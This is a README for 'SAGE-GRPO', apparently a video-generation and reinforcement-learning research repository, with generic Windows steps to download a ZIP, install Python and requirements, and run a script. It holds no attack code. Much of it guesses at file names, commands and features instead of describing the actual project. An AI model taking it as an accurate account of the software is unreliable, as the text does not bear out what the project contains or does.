# 🧠 SAGE-GRPO - Video RL Made Easier

[![Download SAGE-GRPO](https://img.shields.io/badge/Download-SAGE--GRPO-blue?style=for-the-badge)](https://github.com/Palaeoclimatologygurnard179/SAGE-GRPO)

## 🚀 What This Is

SAGE-GRPO is a Windows-ready project for running research code tied to video generation and reinforcement learning. It gives you a way to set up the software, open the project files, and run the main workflow from your PC.

This README is written for a normal Windows user. You do not need to know Git or Python to start, but you will need to follow the steps in order.

## 📥 Download

Use this link to visit the page and download the project files:

[Download SAGE-GRPO](https://github.com/Palaeoclimatologygurnard179/SAGE-GRPO)

If the page shows a **Code** button, open it and choose **Download ZIP**. Save the file to a folder you can find later, such as **Downloads** or **Desktop**.

## 🖥️ What You Need

Before you begin, make sure your Windows PC has:

- Windows 10 or Windows 11
- At least 16 GB of RAM
- Enough free disk space for project files and model data
- A working internet connection
- Administrator access if Windows asks for it

For best results, use a machine with an NVIDIA GPU and current drivers. The project may still open without one, but video generation and training tasks can take much longer.

## 📦 Install the Files

1. Open the download page.
2. Click **Code**.
3. Click **Download ZIP**.
4. Wait for the file to finish downloading.
5. Find the ZIP file in your **Downloads** folder.
6. Right-click the ZIP file and choose **Extract All**.
7. Pick a simple folder path, such as `C:\SAGE-GRPO`.
8. Open the extracted folder after Windows finishes unpacking it.

## 🧰 Set Up Python

SAGE-GRPO uses Python to run. If Python is not already on your PC, install it first.

1. Open your browser.
2. Go to the Python download page: https://www.python.org/downloads/
3. Download Python 3.10 or newer.
4. Run the installer.
5. Check the box that says **Add Python to PATH**.
6. Click **Install Now**.
7. Wait for setup to finish.

To check that Python works:

1. Press **Windows Key + R**
2. Type `cmd`
3. Press **Enter**
4. Type:

   `python --version`

If Windows shows a version number, Python is ready.

## 🔧 Install the Project Tools

Open the extracted SAGE-GRPO folder. Look for files such as:

- `requirements.txt`
- `setup.py`
- `run.py`
- `main.py`

If you see `requirements.txt`, install the project tools like this:

1. Open the folder in File Explorer.
2. Click the address bar.
3. Type `cmd` and press **Enter**.
4. In the black window, type:

   `python -m pip install -r requirements.txt`

5. Press **Enter**.
6. Wait while Windows installs the needed packages.

If the project includes a setup script, run it with the same command window and follow any prompts shown on screen.

## ▶️ Run SAGE-GRPO

After the tools are installed, start the app or script from the project folder.

Try one of these common commands in Command Prompt:

- `python run.py`
- `python main.py`
- `python app.py`

Use the file name that exists in your folder.

If the project includes a `.bat` file, you can also double-click it to start the program.

## 🎛️ How to Use It

Once the program starts, you may see options for:

- loading a video set
- choosing an output folder
- setting reward values
- starting training
- running evaluation
- saving results

A simple first run often looks like this:

1. Open the app or start script.
2. Choose your input folder.
3. Pick an output folder.
4. Keep the default settings for the first run.
5. Start the process.
6. Wait for the job to finish.
7. Check the output folder for logs, metrics, or generated video files

If the app shows a config file, you can edit it later to change batch size, learning rate, or frame settings.

## 🗂️ Common Folder Layout

You may see folders such as:

- `data`
- `configs`
- `outputs`
- `checkpoints`
- `logs`
- `scripts`

What they usually mean:

- `data` holds input files
- `configs` stores settings
- `outputs` stores generated results
- `checkpoints` stores saved training states
- `logs` stores run details
- `scripts` holds helper files

## ⚙️ Basic Settings for First Run

If you are new to the project, use simple settings first:

- keep the default batch size
- use a small test set
- leave advanced options unchanged
- use one output folder only
- save checkpoints if the option appears

This helps you confirm that the install works before you run larger jobs.

## 🧪 Check That It Works

After the first run, look for signs that the program started correctly:

- a command window stays open
- text appears about loading modules
- output files appear in the `outputs` folder
- a log file is created
- the app window responds when you click buttons

If nothing happens, check the file name you used to start the program.

## 🛠️ Troubleshooting

### The window closes right away

- Open Command Prompt first
- Start the program from inside the folder
- Read the error message before closing the window

### Python is not found

- Reinstall Python
- Check **Add Python to PATH**
- Close Command Prompt and open it again

### Requirements install fails

- Make sure your internet connection works
- Update pip with:

  `python -m pip install --upgrade pip`

- Run the install command again

### The app cannot find a file

- Make sure you extracted the ZIP file
- Do not run it from inside the ZIP
- Keep the folder path short, such as `C:\SAGE-GRPO`

### GPU memory errors appear

- Close other apps
- Use smaller input files
- Lower batch size
- Try a lighter config if the project has one

## 🔍 Example Windows Start Flow

Use this simple flow if you want the shortest path from download to run:

1. Visit the download page
2. Download the ZIP file
3. Extract it to `C:\SAGE-GRPO`
4. Install Python 3.10 or newer
5. Open Command Prompt in the project folder
6. Run `python -m pip install -r requirements.txt`
7. Start the main script
8. Check the output folder for results

## 📌 File Safety Tips

- Keep the folder in one place
- Do not rename key files unless the project instructions say to
- Do not move parts of the project into other folders
- If Windows asks for permission, review the prompt before clicking **Yes**
- Keep your input videos in a separate folder from the project files

## 🧭 Where to Look First

If you are not sure what to click, check these items in order:

1. the main folder you extracted
2. any `README` file inside the project
3. `requirements.txt`
4. `run.py` or `main.py`
5. the `configs` folder
6. the `outputs` folder after the program runs

## 📝 Typical Use Case

SAGE-GRPO is useful if you want to test a research workflow for video generation and reinforcement learning on Windows. It lets you set up the code, run the process, and inspect the results from your local machine

## 🔗 Download Again

If you need the project files again, use the same link here:

[Download SAGE-GRPO](https://github.com/Palaeoclimatologygurnard179/SAGE-GRPO)

